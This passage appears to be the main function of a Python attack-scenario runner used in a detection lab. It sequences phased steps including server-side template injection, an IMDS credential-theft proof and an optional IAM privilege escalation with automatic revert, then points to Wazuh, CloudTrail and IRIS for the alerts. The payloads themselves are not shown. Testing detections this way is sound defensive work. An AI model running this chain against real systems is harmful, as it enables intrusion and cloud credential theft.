    if args.restore_policy:
        restore_policy()
        return

    if args.list:
        for name in full_order:
            print(f"  [{_phase_of(name)}] {name}")
        return

    if args.phase:
        selected = [n for n in full_order if _phase_of(n) == args.phase.upper()]
        if not selected:
            parser.error(f"no steps in phase {args.phase!r} (phases: A B C D E F G)")
    elif args.steps == ["all"]:
        selected = list(full_order)
    else:
        unknown = [s for s in args.steps if s not in all_steps]
        if unknown:
            parser.error(f"unknown step(s): {', '.join(unknown)} (use --list)")
        selected = args.steps

    target = args.target.rstrip("/")
    log(f"Target: {target}")
    log(f"Steps: {', '.join(selected)}")

    state = {"target": target, "session": None, "escalate": args.escalate}
    # Authenticate to the web app only if any SSTI (web) step is selected.
    if any(s in BY_NAME for s in selected):
        state["session"] = get_session(target)

    for i, name in enumerate(selected):
        if i > 0:
            time.sleep(args.delay)
        try:
            run_step(state, name)
        except Exception as e:  # keep going even if one step errors out
            warn(f"{name} failed: {e}")

    # Auto-revert the privilege escalation at the end of the chain (unless opted out).
    if args.escalate and state.get("escalated") and not args.no_restore:
        log("Auto-reverting the IAM privilege escalation...")
        restore_policy()

    log("All done. Check Wazuh (ModSecurity + docker-listener + CloudTrail + finance) / IRIS.")
    log("Cleanup on target host if needed:  docker rm -f pp imds-v2-creds-proof")
    if args.escalate and args.no_restore:
        warn("You used --escalate --no-restore: revert manually when done:  "
             "python3 scenario3_attack_runner.py --restore-policy")


if __name__ == "__main__":
    main()
